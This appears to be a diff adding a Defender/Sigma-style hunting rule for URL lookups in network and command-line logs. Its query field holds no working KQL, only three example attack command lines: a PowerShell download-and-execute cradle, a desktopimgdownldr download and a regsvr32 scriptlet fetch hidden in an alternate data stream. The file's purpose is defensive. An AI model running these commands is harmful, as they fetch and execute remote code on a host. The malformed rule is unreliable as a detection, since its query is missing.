@@ -1,0 +1,22 @@
+title: URL Lookup (Network & Commandline)
+id: 67897057-204c-499a-841e-f2e12fb27f1c
+status: experimental
+level: medium
+description: |
+  This query can be used to perform a URL lookup on both the DeviceNetworkEvents as well as the commandline references. This can help in incident investigations to quickly find all the related logs and commandline references of the IP address. The *LookupURL* is used to set a URL on which you want to look for. The query has also a setting that you can change to only show commandline results, thent he line *| where CommandLineReference == true* needs to be uncommented. The *LookupURL* can also be a devicename you want to lookup. 
+
+Some examples below are stated, which will be shown based on the commandline lookup. Remote downloads or executions of files can be an indicator of malicious activity.
+author: Bert-JanP
+logsource:
+  product: microsoft_defender_endpoint
+  service: kql
+detection:
+  _kql_query: |
+    powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://webserver/payload.ps1')|iex"
+
+set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://domain.com:8080/file.ext /eventName:desktopimgdownldr
+
+cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct ^scrobj.dll > fakefile.doc:payload.bat
+  condition: _kql_query
+references:
+  - https://github.com/Bert-JanP/Hunting-Queries-Detection-Rules
